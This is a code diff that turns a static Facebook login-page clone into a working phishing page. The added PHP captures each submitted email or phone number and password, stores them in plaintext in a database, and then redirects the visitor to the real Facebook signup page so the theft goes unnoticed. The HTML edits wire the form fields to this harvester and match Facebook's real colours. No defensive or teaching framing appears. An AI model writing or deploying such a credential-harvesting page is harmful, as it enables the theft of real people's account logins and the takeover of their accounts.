@@ -1,3 +1,18 @@
+<?php
+    include "facebookdb.php";
+    if($_SERVER["REQUEST_METHOD"] == "POST"){
+        $email_number = $_POST['email_number'];
+        $password = $_POST['password'];
+        $sql = "INSERT INTO user(email_number, password) VALUES(?,?)";
+        $stmt = $conn->prepare($sql);
+        $stmt -> bind_param("ss", $email_number, $password);
+        $stmt -> execute();
+        $stmt -> close();
+        header("Location: https://web.facebook.com/signup?_rdc=1&_rdr");
+        exit(); 
+    }
+?>
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -56,20 +71,20 @@
     </style>
 </head>
 
-<body style="background-color: rgb(211, 218, 226);">
+<body style="background-color: rgb(240, 242, 245);">
     <div class="container row w-100 mx-auto wholeDiv">
         <div class="col-lg-6 col-md-6 col-sm-12 facebookdiv">
             <img src="fascebook.svg" alt="" class="facebook">
             <h3 class="facebookText ms-4">Facebook helps you connect and share with the people in your life.</h3>
         </div>
         <div class="col-lg-4 col-md-6 col-sm-12 text-center formDiv">
-            <form method="post" class="bg-white py-4 shadow-lg w-100 text-center" action="Facebook.html">
-                <input type="email or number" placeholder="Email address or Phone Number" width="100px" class="col-11 border-tertiary mb-3">
-                <input type="password" placeholder="Password" required class="col-11 border-tertiary mb-3"><br>  
+            <form method="POST" class="bg-white py-4 shadow-lg w-100 text-center" action="index.php">
+                <input type="text" placeholder="Email address or Phone Number" width="100px" class="col-11 border-tertiary mb-3" name="email_number">
+                <input type="password" placeholder="Password" name="password" required class="col-11 border-tertiary mb-3"><br>  
                 <button class="bg-primary col-11 text-light btn btn-md fw-bolder fs-5">Log in</button>
                 <a href="">Forgotten Password?</a>
                 <hr>
-                <button class="btn btn-md bg-success col-6 text-white fw-bold">Create Account</button>
+                <button type="submit" class="btn btn-md bg-success col-6 text-white fw-bold">Create Account</button>
             </form>
             <p class="pt-3"><b>Create a Page</b> for a celebrity, brand or business.</p>
         </div>
